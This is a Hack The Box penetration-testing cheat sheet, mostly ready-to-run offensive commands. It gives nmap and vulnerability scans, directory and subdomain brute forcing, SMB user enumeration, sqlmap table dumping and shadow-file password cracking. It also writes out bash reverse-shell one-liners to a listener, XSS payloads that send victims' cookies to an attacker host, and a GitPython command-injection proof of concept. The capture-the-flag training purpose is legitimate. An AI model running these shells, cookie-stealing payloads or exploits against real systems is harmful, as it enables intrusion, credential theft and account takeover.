# HTB-CheatSheet

Now Updating...

# Basics

## Nmap - Port Scanning

### [Nmap Cheat Sheet - TutorialsPoint](https://www.tutorialspoint.com/nmap-cheat-sheet)

### TCP and UDP Scan Examples

```bash
# Basic scan
sudo nmap -v -sS -sC -sV --top-ports 3500 <target_ip>

# Full scan
sudo nmap -v -sS -A -p- <target_ip>

# Use if no hosts respond to ping
sudo nmap -v -sS -Pn <target_ip>

# Use if SYN scan takes too long
nmap -v -sT -p- --min-rate 5000 --max-retries 1 <target_ip>

# UDP scan
nmap -v -sU -T4 --top-ports 100 <target_ip>
```

### NSE (Nmap Scripting Engine)

```bash
# Update system file database and search for NSE scripts
sudo updatedb
locate .nse | grep <script_name>

# Full vulnerability scan
# Warning: --script-args=unsafe=1 may cause issues on target systems
sudo nmap -v -sS -Pn --script=vuln --script-args=unsafe=1 <target_ip>
```

## Reverse shell

### [Reverse Shell Generator](https://www.revshells.com/)

### [Reverse Shell Cheat Sheet - Internal All The Things](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/)

### Bash
```bash
bash -i >& /dev/tcp/10.0.0.1/4444 0>&1
/bin/bash -l > /dev/tcp/10.0.0.1/4444 0<&1 2>&1
bash -c 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'
/bin/bash -c 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'
```

### Upgrade Shell

```bash
script /dev/null -c /bin/bash
python -c 'import pty; pty.spawn("/bin/bash")'

# After spawning a pty, run these commands:
# Suspend the current process
CTRL+Z 
# Configure the terminal and bring the background job to the foreground
stty raw -echo; fg
# Set the TERM environment variable for full terminal functionality
export TERM=xterm
```

## Password Cracking

### John the Ripper

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt --format=<hash_type>

# Convert shadow file to John format
unshadow /etc/shadow /etc/passwd > hash.txt

# Show cracked passwords
john --show hash.txt
john --show --format=<hash_type> hash.txt

# Crack ZIP file password
zip2john encrypted.zip > zip.hash
john zip.hash
```

# Network Services Pentesting

## 80,443 - HTTP/HTTPS

### Directory Brute Forcing

```bash
# Fast scan using a smaller wordlist for quick results
gobuster dir -e -t 50 -u http://<target_host> -w /usr/share/wordlists/dirb/big.txt

# Full scan using a more comprehensive wordlist
gobuster dir -e -t 50 -u http://<target_host> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

# Additional useful wordlists
/usr/share/seclists/Discovery/Web-Content/big.txt
/usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt
/usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt

# Gobuster options
-e                          # Print full URLs in output
-t <number>                 # Number of concurrent threads (default 10)
-b <status>                 # Exclude status codes, comma separated list of codes and ranges
--exclude-length <lengths>  # Exclude content lengths, comma separated list of codes and ranges
-x <extensions>             # File extensions to search for, comma-separated
-o <filename>               # Output file to write results to

# Common File Extensions
-x php,asp,aspx,jsp,html,js,txt,old,bak,cgi,pl,py,sh,do

# Common Picture Extensions
-x png,jpg,jpeg,gif,bmp,svg,ico
```

### Subdomain Brute Forcing

```bash
# Fast scan using a smaller wordlist for quick results
ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://<target_host>/ -H "Host: FUZZ.<target_host>" -H "User-Agent: PENTEST" -c -t 100 -ac -v

# Full scan using a more comprehensive wordlist
ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://<target_host>/ -H "Host: FUZZ.<target_host>" -H "User-Agent: PENTEST" -c -t 100 -ac -v

# Scan using a custom request file
# - Add "FUZZ" keyword in the Host header of request.txt to inject subdomains
# - Useful for complex requests or when specific headers/body are required
ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://trickster.htb -request request.txt -c -ac -v

# Additional useful wordlists
/usr/share/wordlists/seclists/Discovery/DNS/dns-Jhaddix.txt
/usr/share/wordlists/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt
/usr/share/wordlists/dirbuster/dns-names.txt

# ffuf options
-H <header: value>   # Add custom headers
-t <number>          # Number of concurrent threads (default 40)
-ac                  # Automatically calibrate filtering options
-fc <status>         # Filter HTTP status codes from response, comma separated list of codes and ranges
-fs <size>           # Filter response size
-r                   # Follow redirects
-request <filename>  # Load a custom HTTP request from a file containing the raw http request
-o <filename>        # Write output to file
-of <format>         # Output file format (json, ejson, html, md, csv, ecsv)
```

## 139,445 - SMB

### Obtain Information

```bash
enum4linux-ng -A -u <username> -p <password> <target_ip>
enum4linux -a -u <username> -p <password> <target_ip>
enum4linux-ng -A -u 'guest' -p '' <target_ip>
enum4linux -a -u 'guest' -p '' <target_ip>
```

### Get Sharelists

```bash
smbclient -N -L <target_ip>
nxc smb <target_ip> -u 'guest' -p '' --shares --verbose
```

### Enumerate Users

```bash
# RID cycling with limited or no credentials
# Useful for initial reconnaissance
nxc smb <target_ip> -u 'guest' -p '' --rid-brute --verbose
enum4linux-ng -R -r 500-550,1000-1500 -u 'guest' -p '' <target_ip>

# Comprehensive user enumeration with valid credentials
# Provides more detailed information
nxc smb <target_ip> -u <username> -p <password> --users --verbose
enum4linux-ng -U -u <username> -p <password> <target_ip>
```

# Web Application Analysis

## Fuzzing
```bash
# Basic ffuf command structure for web application fuzzing
# -request-proto: Set the request protocol (http or https)
ffuf -request request.txt -w <FUZZ_wordlist> -request-proto http -fs <size>
```

## SQL Injection

### SQLMap

```bash
# Enumerate DBMS databases
sqlmap -r request.txt -p <target_param> --level=5 --risk=3 --batch --delay=0.1 --random-agent --dbs

# Enumerate DBMS database tables
sqlmap -r request.txt -p <target_param> --level=5 --risk=3 --batch --delay=0.1 --random-agent -D <DB_name> --tables

# Enumerate DBMS database table columns
sqlmap -r request.txt -p <target_param> --level=5 --risk=3 --batch --delay=0.1 --random-agent -D <DB_name> -T <TABLE_name> --columns

# Dump DBMS database table entries
sqlmap -r request.txt -p <target_param> --level=5 --risk=3 --batch --delay=0.1 --random-agent -D <DB_name> -T <TABLE_name> -C <column_name_1,column_name_2> --dump

# SQLMap options
--delay=<delay_seconds> # Delay in seconds between each HTTP request
--batch                 # Never ask for user input, use the default behavior
--random-agent          # Use randomly selected HTTP User-Agent header value
--dbms=<dbms>           # Specify DBMS type if known (e.g., mysql, postgresql, mssql)
--current-user          # Retrieve DBMS current user
--sql-shell             # Prompt for an interactive SQL shell
```

## XSS

### Basic Payloads

```Properties files
<script>alert('XSS');</script>
<script>alert(document.cookie);</script>
<img src=x onerror=alert('XSS');>
<svg onload=alert('XSS');>
```

### Cookie Stealing

```Properties files
# Redirect with cookies
<script>document.location='http://<attacker_ip>:<attacker_port>/steal?cookie='+document.cookie;</script>
<script>fetch('http://<attacker_ip>:<attacker_port>/steal?cookie='+document.cookie);</script>

# Using image object (works in environments where script tags are filtered)
<img src=x onerror="this.src='http://<attacker_ip>:<attacker_port>/steal?cookie='+document.cookie;">
```


# Linux Privilege Escalation


# Windows Privilege Escalation

## Abusing Tokens

### SeBackupPrivilege

- [Windows Privilege Escalation: SeBackupPrivilege](https://www.hackingarticles.in/windows-privilege-escalation-sebackupprivilege/)
- [Windows PrivEsc with SeBackupPrivilege](https://medium.com/r3d-buck3t/windows-privesc-with-sebackupprivilege-65d2cd1eb960#5c26)


# Common Privilege Escalation Techniques

## Chrome Remote Debugger

- [Chrome Remote Debugger Pentesting](https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/chrome-remote-debugger-pentesting/)
- [Node inspector/CEF debug abuse](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/electron-cef-chromium-debugger-abuse)

```bash
# === Linux ===
# Check if Chrome remote debugging is running
ps aux | grep remote-debugging-port

# If --remote-debugging-port=0, a random open port is used
# Use netstat to find potential Chrome-related ports and brute force them
netstat -tuln
```

# CVEs

## CVE-2022-24439 - GitPython RCE
- Affecting gitpython package, versions [0,3.1.30)
```python
# PoC
from git import Repo
r = Repo.init('', bare=True)
r.clone_from('ext::sh -c touch% /tmp/pwned', 'tmp', multi_options=["-c protocol.ext.allow=always"])
```
> https://security.snyk.io/vuln/SNYK-PYTHON-GITPYTHON-3113858


